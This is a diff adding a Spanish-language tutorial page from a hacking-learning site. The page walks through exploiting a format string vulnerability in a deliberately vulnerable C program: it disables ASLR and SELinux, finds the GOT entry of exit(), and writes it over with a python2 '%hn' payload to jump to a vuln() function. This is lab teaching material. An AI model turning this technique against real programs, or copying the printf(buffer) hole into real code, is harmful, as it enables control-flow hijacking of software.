@@ -1,0 +1,182 @@
+
+<!DOCTYPE html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
+	<link rel="stylesheet" type="text/css" href="css/al_zo_ex.css">
+
+ 
+	<title>Vulnerabilidad Format string usando GOT 2</title>
+</head>
+<body>
+
+<header>
+
+  <nav class="navbar navbar-expand-md navbar-light shadow-5-strong">
+      <div class="container-fluid">
+        <a class="navbar-brand text-primary" href="secur-home.html">learn@hacks#</a>
+
+        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#submenus" aria-controls="submenus" aria-expanded="false" arial-label="Toggler navigation">
+          <span class="navbar-toggler-icon"></span>
+        </button>
+
+        <div class="collapse navbar-collapse justify-content-md-center" id="submenus">
+          <ul class="navbar-nav">
+            
+            <li class="nav-item active"><a class="nav-link text-primary" href="secur-home.html">Inicio</a></li>
+            <li class="nav-item dropdown">
+                <a class="nav-link dropdown-toggle text-primary" href="#" data-bs-toggle="dropdown">Exploit Education</a>
+                <ul class="dropdown-menu">
+                    <li><a class="dropdown-item nav-link text-primary" href="proofExEducation.html">Phoenix</a></li>
+                    <li><a class="dropdown-item nav-link text-primary" href="proofNbEducation.html">Nebula</a></li>
+                    <li><a class="dropdown-item nav-link text-primary" href="proofFsEducation.html">Fusion</a></li>
+                </ul>
+            </li>
+
+            <li class="nav-item dropdown">
+          <a class="nav-link dropdown-toggle text-primary" data-bs-toggle="dropdown" href="#">CTFs</a>
+                <ul class="dropdown-menu">
+                    <li><a class="dropdown-item nav-link text-primary" href="proofVlhub.html">Vulnhub</a></li>
+                    <li><a class="dropdown-item nav-link text-primary" href="picoFlags.html">picoCTF</a></li>
+                    <li><a class="dropdown-item nav-link text-primary" href="RPISEC_MBE.html">RPISEC</a></li>
+                    <li><a class="dropdown-item nav-link text-primary" href="pwnable_kr.html">pwnable</a></li>
+        </ul>
+            </li>
+
+            <li class="nav-item ">
+                <a class="nav-link text-primary nav-link-color" href="shlpage.html">Shellcodes</a>
+            </li>
+
+            <li class="nav-item ">
+                <a class="nav-link text-primary nav-link-color" href="tutoriales.html">Tutoriales</a>
+            </li> 
+
+            <li class="nav-item">
+              <a class="nav-link text-primary nav-link-color" href="https://github.com/BGPavelAng">Github</a>
+            </li>
+
+            <li>
+              <a class="nav-link text-primary nav-link-color" href="https://www.patreon.com/BGPavelAng">Patreon</a>
+            </li>
+
+          </ul>
+        </div>
+    </div>
+  </nav>
+</header>
+
+<div class="container-fluid">
+    <div class="row">
+      <div class="col">
+        <div class="img-bran d-none d-md-none d-lg-block">
+          
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="container mt-5">
+    <div class="row mt-5">
+      <div class="col">
+
+            <p>Vulnerabilidad Format string usando GOT 2</p>
+            
+            
+             <p style="padding: 10px; border: 2px solid red; background-color: rgba(255, 204, 204, 0.3);">
+            
+            
+                void vuln(){<br>
+                
+                    printf("Logrado\n");<br>
+                }<br>
+                
+                
+                int main(int argc, char **argv[]) {<br>
+                    
+                    char buffer[64];<br>
+                
+                    fgets(buffer, sizeof(buffer), stdin);<br>
+                
+                    printf(buffer);<br>
+                
+                    exit(1);<br>
+                    
+                }
+              <br>
+                
+              gcc -m32 -mpreferred-stack-boundary=2 -fno-stack-protector -z execstack overflow.c -o overflow<br><br></p>
+
+<p>Algunas veces es necesario desactivar selinux con setenforce 0, no es siempre, pero te resuelve algunos problemas, pero repito, no es necesario si no haz presentado algun problema extraño.</p>
+<p>Vamos a explicar una representación de la memoria antes para entender que está pasando.</p>
+
+<p style="padding: 10px; border: 2px solid red; background-color: rgba(255, 204, 204, 0.3);">
+
+  sysctl -w kernel.randomize_va_space=0<br><br>
+
+Para restaurar<br>
+setenforce 1<br>
+sysctl -w kernel.randomize_va_space=2<br>
+
+</p>
+
+<p>Vamos a explicar como podemos hacer una vulnerabilidad format string pero con otro escenario posible, vamos a realizar lo ya aprendido antes para verificar si es vulnerable</p>
+
+<img class="img-fluid" src="img/formatstr1_4.png"><br><br>
+
+<p>Si es vulnerable, vamos a cortar los datos de entrada.</p>
+
+<img class="img-fluid" src="img/formatstr2_4.png"><br><br>
+
+<p>Listo, ahora vamos a buscar GOT para saltar a la función vuln, usaremos masamunpex.</p> 
+
+<img class="img-fluid" src="img/formatstr3_4.png"><br><br>
+
+<p>Vamos a utilizar el got de Exit que sería 0x0804b21c, vamos a verificar si es efectivo.</p>
+
+<img class="img-fluid" src="img/formatstr4_4.png"><br><br>
+<img class="img-fluid" src="img/formatstr5_4.png"><br><br>
+
+<p>Al parecer si es efectivo, vamos a buscar cambiar la dirección de GOT por la de vuln, vamos a buscar la función de vuln usando gdb con info function.</p>
+
+<img class="img-fluid" src="img/formatstr6_4.png"><br><br>
+
+<p>Ya tenemos la dirección que es <b>0x08049196</b>, pero ahora vamos a cambiarlo.</p>
+
+<p style="padding: 10px; border: 2px solid red; background-color: rgba(255, 204, 204, 0.3);">
+  0x9196 ->  37270 decimal -> 37270 - 8 bytes (GOT) serían = 37262<br>
+  0x0804 -> 2052 decimal
+</p>
+
+<p>Pero aquí hay un problema <b>-> 2052 - 37266 = -35214 -> FFFFFFFFFFFF7672</b></p>
+
+<p>Esto no funciona, entonces ¿qué podriamos hacer?, sencillo... no necesitamos "0x0804", porque ya lo tenemos -> "0x0804b21c", ya solo debemos cambiar "0xb21c", ¿no crees?. Entonces... vamos a cambiar esto...</p>
+
+
+
+<p style="padding: 10px; border: 2px solid red; background-color: rgba(255, 204, 204, 0.3);">0x9196 ->  37270 decimal -> 37270 - 4 bytes (GOT) serían = 37266, porque solo usaremos los 4 bytes de "0xb21c".<br>
+
+  Vamos a intentarlo así... $(python2 -c 'print "\x1c\xb2\x04\x08" + "%37266x%4$hn"')</p>
+
+  <img class="img-fluid" src="img/formatstr7_4.png"><br><br>
+
+  <p>No funcionó, pero hay momentos donde tenemos que salir de la caja, vamos a revisar las direcciones, las dos a modificar serían "\x1c\xb2\x04\x08" -> "\x1e\xb2\x04\x08", pero al parecer obtenemos el mismo resultado, entonces vamos a cambiar el rango de 37270 -> 37266.</p>
+
+  <img class="img-fluid" src="img/formatstr8_4.png"><br><br>
+
+<p>Listo, solo era que se necesitaba alinear bien "%37270" -> "%37269" y ya, se activa la función.</p>
+
+      </div>
+
+    </div>
+  </div>
+
+  <footer class="footer mt-auto py-3 bg-light">
+  <div class="container">
+    <span class="text-muted">Aprende algo nuevo todos los días. Good luck!</span>
+  </div>
+</footer>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
+</body>
+</html>
+      
